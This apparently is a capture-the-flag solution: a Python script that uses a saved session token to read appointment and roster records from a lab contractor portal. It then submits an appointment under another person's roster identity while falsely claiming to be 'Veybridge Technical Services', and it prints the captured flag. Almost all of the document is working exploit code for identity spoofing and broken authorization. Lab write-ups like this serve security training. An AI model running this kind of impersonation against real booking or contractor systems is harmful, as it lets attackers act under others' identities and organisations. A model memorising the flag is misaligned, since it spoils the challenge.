Use appointment details from W13.1 and roster identity from W13.2.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

# Get appointment details (W13.1)
d1 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://contractor-portal.arwc.test/api/appointment-windows/current",
                            headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
rec1 = d1["record"]
# Get roster identity (W13.2)
d2 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://contractor-portal.arwc.test/api/appointment-windows/current/visitors",
                            headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
identity = d2["record"]["identity"]  # The roster identity, not the appointment's attendee

# Submit appointment with roster identity but claim Veybridge Technical Services
body = json.dumps({
    "appointment_id": rec1["record_id"],
    "expected_revision": 1,
    "attendee": identity,
    "caller_organization": "Veybridge Technical Services",
    "inspection": rec1["inspection"],
    "asset": rec1["asset"],
    "window": rec1["window"],
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://contractor-portal.arwc.test/api/appointments/current",
                            data=body, headers=h, method="POST"),
    context=ctx).read())
print("attendee:", d["record"]["attendee"])  # veybridge.tech.204 (not appointment owner)
print("flag:", d["flag"])                    # FLAG{ee54f78b836e3f3d}
```

Flag: `FLAG{ee54f78b836e3f3d}` in the top-level `flag` field.
